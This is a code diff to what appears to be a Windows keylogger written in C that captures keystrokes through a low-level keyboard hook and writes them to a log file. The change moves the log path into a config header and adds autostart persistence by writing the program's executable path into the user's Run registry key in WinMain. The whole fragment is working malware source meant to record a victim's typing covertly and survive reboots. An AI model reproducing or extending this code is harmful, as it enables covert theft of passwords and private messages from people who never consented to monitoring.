@@ -3,7 +3,7 @@
 #include <time.h>
 #include <locale.h>
 
-#define LOG_PATH L".log.txt"
+#include "config.h"
 
 static BYTE key_state[256] = {0};
 static wchar_t char_buff[2] = {'\0'};
@@ -91,6 +91,20 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nShowCmd)
 {
    setlocale(LC_ALL, ".UTF8");
+
+   HKEY hk;
+   DWORD dwSize = MAX_PATH;
+   DWORD dwRet;
+   
+   dwRet = RegCreateKey (HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hk);
+
+   if (dwRet == ERROR_SUCCESS)
+      RegSetValueExW (hk, REG_KEY, 0, REG_SZ, (LPSTR) EXE_PATH, MAX_PATH);
+   else
+   {
+      fprintf (stderr, "RegCreateKey: %d\n", dwRet);
+      exit (1);
+   }
    
 
    // set low level keyboard windows hook
